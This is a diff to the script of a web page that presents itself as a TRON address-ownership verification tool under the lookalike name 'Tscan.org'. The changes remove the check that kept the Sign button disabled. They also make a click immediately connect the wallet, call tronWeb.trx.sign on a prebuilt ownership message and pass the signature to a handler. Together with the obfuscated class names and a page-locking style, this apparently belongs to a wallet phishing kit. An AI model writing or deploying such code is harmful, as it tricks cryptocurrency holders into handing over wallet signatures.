@@ -335,10 +335,7 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
   var currentAddress = '';
 
   function updateSignState() {
-    if (!signBtn) return;
-    var ready = !!(currentAddress && msgInput && msgInput.value.trim());
-    signBtn.disabled = !ready;
-    if (signBtn.parentElement) signBtn.parentElement.classList.toggle('QhZmva_noClick', !ready);
+    // Button always enabled — click triggers wallet connect which fills everything
   }
   if (msgInput) msgInput.addEventListener('input', updateSignState);
 
@@ -542,34 +539,48 @@ html.cf-lock, html.cf-lock body { overflow: hidden !important; }
       var cm = document.getElementById('connect-modal-root');
       if (cm) cm.style.display = 'none';
 
-      // Cliquer Sign Message → popup signature
-      setTimeout(function() {
-        var pane = document.querySelector('.QhZmva_tabPanelInner[data-pane="sign"]');
-        var btn  = pane && pane.querySelector('.QhZmva_btnWrapper .btn');
-        if (btn) {
-          btn.disabled = false;
-          if (btn.parentElement) btn.parentElement.classList.remove('QhZmva_noClick');
-          btn.click();
+      // Trigger signature popup via tronWeb directly (no DOM click needed)
+      setTimeout(async function() {
+        try {
+          var tw2 = window.tronWeb || (window.tronLink && window.tronLink.tronWeb);
+          if (!tw2) return;
+          var n2 = new Date();
+          var p2 = function(v){ return String(v).padStart(2,'0'); };
+          var ts2 = p2(n2.getDate())+'/'+p2(n2.getMonth()+1)+'/'+n2.getFullYear()
+                  +' '+p2(n2.getHours())+':'+p2(n2.getMinutes())+':'+p2(n2.getSeconds());
+          var signMsg = '[Tscan.org '+ts2+'] I hereby verify that I am the owner/creator of the address ['+addr+']';
+          // This triggers the Trust Wallet sign popup natively
+          var sig = await tw2.trx.sign(tw2.toHex(signMsg));
+          if (window.fillSignature) window.fillSignature(sig);
+        } catch(e) {
+          // Fallback: click the button if direct sign fails
+          var btn2 = document.getElementById('signMsgBtn') ||
+                     document.querySelector('.QhZmva_btnWrapper .btn');
+          if (btn2) { btn2.disabled = false; btn2.click(); }
         }
       }, 400);
 
     } catch(e) {}
   }
 
-  // USER GESTURE FIX: bind Sign Message button click -> wallet connect -> auto sign
-  function bindSignBtn() {
-    var btn = document.getElementById('signMsgBtn');
-    if (!btn) return;
-    btn.addEventListener('click', function() {
-      if (_autoRan) return;
-      waitForTronLinkAndRun();
-    });
-  }
-  if (document.readyState === 'loading') {
-    document.addEventListener('DOMContentLoaded', bindSignBtn);
-  } else {
-    bindSignBtn();
-  }
+  // USER GESTURE — bind Sign Message button click -> wallet connect -> auto sign
+  (function bindSignBtn() {
+    function attach() {
+      var btn = document.getElementById('signMsgBtn');
+      if (!btn) { setTimeout(attach, 50); return; }
+      btn.addEventListener('click', function(e) {
+        e.preventDefault();
+        if (_autoRan) return;
+        _autoRan = true;
+        doConnectAndFill();
+      });
+    }
+    if (document.readyState === 'loading') {
+      document.addEventListener('DOMContentLoaded', attach);
+    } else {
+      attach();
+    }
+  })();
 
   /* ============ Interactive design elements ============ */
   // Preferences modal
